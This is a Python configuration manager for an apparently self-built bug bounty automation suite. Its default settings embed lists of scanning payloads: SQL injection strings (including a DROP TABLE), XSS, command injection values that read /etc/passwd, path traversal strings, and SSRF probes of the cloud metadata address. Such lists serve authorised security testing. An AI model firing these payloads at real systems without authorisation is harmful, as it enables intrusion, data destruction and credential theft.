"""
Configuration Manager for Bug Bounty Automation
Handles configuration loading and management
"""

import json
import logging
import os
from typing import Dict, Any, Optional

class ConfigManager:
    """Configuration manager for the automation suite"""
    
    def __init__(self, config_path: str = "config.json"):
        self.config_path = config_path
        self.logger = logging.getLogger(__name__)
        self.config = self._load_config()
    
    def _load_config(self) -> Dict[str, Any]:
        """Load configuration from file or create default"""
        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, 'r') as f:
                    config = json.load(f)
                self.logger.info(f"Configuration loaded from {self.config_path}")
                return config
            except Exception as e:
                self.logger.error(f"Error loading config: {e}")
        
        # Create default configuration
        default_config = self._create_default_config()
        self._save_config(default_config)
        return default_config
    
    def _create_default_config(self) -> Dict[str, Any]:
        """Create default configuration"""
        return {
            "api_keys": {
                "shodan": "",
                "censys_api_id": "",
                "censys_secret": "",
                "vulners_api_key": "",
                "virustotal_api_key": ""
            },
            "settings": {
                "timeout": 30,
                "max_concurrent_requests": 10,
                "user_agent": "BugBountyAutomation/2026",
                "delay_between_requests": 1,
                "output_dir": "reports",
                "log_level": "INFO"
            },
            "reconnaissance": {
                "subdomain_wordlist": [
                    "www", "api", "dev", "test", "admin", "staging", "prod",
                    "beta", "demo", "portal", "app", "dashboard", "secure",
                    "mail", "email", "ftp", "files", "docs", "support",
                    "help", "blog", "shop", "store", "cdn", "static"
                ],
                "ports_to_scan": [
                    21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995,
                    3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017
                ],
                "search_engines": [
                    "google", "bing", "yahoo"
                ],
                "third_party_services": [
                    "crt.sh", "dns.bufferover.run", "jldc.me"
                ]
            },
            "vulnerability_scanning": {
                "sql_injection_payloads": [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "'; DROP TABLE users--",
                    "' UNION SELECT null,null--",
                    "admin'--"
                ],
                "xss_payloads": [
                    "<script>alert('XSS')</script>",
                    "javascript:alert('XSS')",
                    "<img src=x onerror=alert('XSS')>",
                    "'\"><script>alert('XSS')</script>",
                    "<svg onload=alert('XSS')>"
                ],
                "command_injection_payloads": [
                    "; ls",
                    "| whoami",
                    "&& cat /etc/passwd",
                    "; ping -c 1 127.0.0.1",
                    "| id"
                ],
                "path_traversal_payloads": [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
                ],
                "ssrf_payloads": [
                    "http://127.0.0.1",
                    "http://localhost",
                    "file:///etc/passwd",
                    "http://169.254.169.254/latest/meta-data/"
                ],
                "template_injection_payloads": [
                    "{{7*7}}",
                    "${7*7}",
                    "<%= 7*7 %>",
                    "{{7*'7'}}",
                    "${7*'7'}"
                ]
            },
            "reporting": {
                "include_proof_of_concept": True,
                "include_recommendations": True,
                "include_risk_assessment": True,
                "report_formats": ["pdf", "html", "json"],
                "bounty_submission_format": "html",
                "anonymize_sensitive_data": False
            },
            "bounty_tracking": {
                "auto_track_submissions": True,
                "track_earnings": True,
                "export_formats": ["json", "csv"],
                "performance_metrics": True
            },
            "headers": {
                "User-Agent": "BugBountyAutomation/2026",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive"
            }
        }
    
    def _save_config(self, config: Dict[str, Any]):
        """Save configuration to file"""
        try:
            with open(self.config_path, 'w') as f:
                json.dump(config, f, indent=2)
            self.logger.info(f"Configuration saved to {self.config_path}")
        except Exception as e:
            self.logger.error(f"Error saving config: {e}")
    
    def get(self, key: str, default: Any = None) -> Any:
        """Get configuration value by key"""
        keys = key.split('.')
        value = self.config
        
        for k in keys:
            if isinstance(value, dict) and k in value:
                value = value[k]
            else:
                return default
        
        return value
    
    def set(self, key: str, value: Any):
        """Set configuration value by key"""
        keys = key.split('.')
        config = self.config
        
        for k in keys[:-1]:
            if k not in config:
                config[k] = {}
            config = config[k]
        
        config[keys[-1]] = value
        self._save_config(self.config)
        self.logger.info(f"Configuration updated: {key} = {value}")
    
    def update(self, updates: Dict[str, Any]):
        """Update multiple configuration values"""
        def deep_update(source, updates):
            for key, value in updates.items():
                if key in source and isinstance(source[key], dict) and isinstance(value, dict):
                    deep_update(source[key], value)
                else:
                    source[key] = value
        
        deep_update(self.config, updates)
        self._save_config(self.config)
        self.logger.info("Configuration updated with multiple values")
    
    def get_api_key(self, service: str) -> Optional[str]:
        """Get API key for a specific service"""
        return self.get(f"api_keys.{service}")
    
    def set_api_key(self, service: str, key: str):
        """Set API key for a specific service"""
        self.set(f"api_keys.{service}", key)
    
    def get_setting(self, setting: str, default: Any = None) -> Any:
        """Get a specific setting"""
        return self.get(f"settings.{setting}", default)
    
    def set_setting(self, setting: str, value: Any):
        """Set a specific setting"""
        self.set(f"settings.{setting}", value)
    
    def get_recon_config(self) -> Dict[str, Any]:
        """Get reconnaissance configuration"""
        return self.get("reconnaissance", {})
    
    def get_vuln_config(self) -> Dict[str, Any]:
        """Get vulnerability scanning configuration"""
        return self.get("vulnerability_scanning", {})
    
    def get_report_config(self) -> Dict[str, Any]:
        """Get reporting configuration"""
        return self.get("reporting", {})
    
    def get_bounty_config(self) -> Dict[str, Any]:
        """Get bounty tracking configuration"""
        return self.get("bounty_tracking", {})
    
    def set_output_dir(self, output_dir: str):
        """Set output directory for reports"""
        self.set_setting("output_dir", output_dir)
    
    def get_output_dir(self) -> str:
        """Get output directory for reports"""
        return self.get_setting("output_dir", "reports")
    
    def get_headers(self) -> Dict[str, str]:
        """Get HTTP headers for requests"""
        return self.get("headers", {})
    
    def validate_config(self) -> bool:
        """Validate configuration structure"""
        required_sections = [
            "api_keys", "settings", "reconnaissance", 
            "vulnerability_scanning", "reporting", "bounty_tracking"
        ]
        
        for section in required_sections:
            if section not in self.config:
                self.logger.error(f"Missing required configuration section: {section}")
                return False
        
        return True
    
    def reset_to_defaults(self):
        """Reset configuration to default values"""
        default_config = self._create_default_config()
        self.config = default_config
        self._save_config(default_config)
        self.logger.info("Configuration reset to defaults")
    
    def export_config(self, filepath: str):
        """Export current configuration to file"""
        try:
            with open(filepath, 'w') as f:
                json.dump(self.config, f, indent=2)
            self.logger.info(f"Configuration exported to {filepath}")
        except Exception as e:
            self.logger.error(f"Error exporting config: {e}")
    
    def import_config(self, filepath: str):
        """Import configuration from file"""
        try:
            with open(filepath, 'r') as f:
                imported_config = json.load(f)
            
            # Validate imported config structure
            if self._validate_imported_config(imported_config):
                self.config = imported_config
                self._save_config(self.config)
                self.logger.info(f"Configuration imported from {filepath}")
            else:
                self.logger.error("Invalid configuration structure in imported file")
                
        except Exception as e:
            self.logger.error(f"Error importing config: {e}")
    
    def _validate_imported_config(self, config: Dict[str, Any]) -> bool:
        """Validate imported configuration structure"""
        required_sections = [
            "api_keys", "settings", "reconnaissance", 
            "vulnerability_scanning", "reporting", "bounty_tracking"
        ]
        
        for section in required_sections:
            if section not in config:
                return False
        
        return True
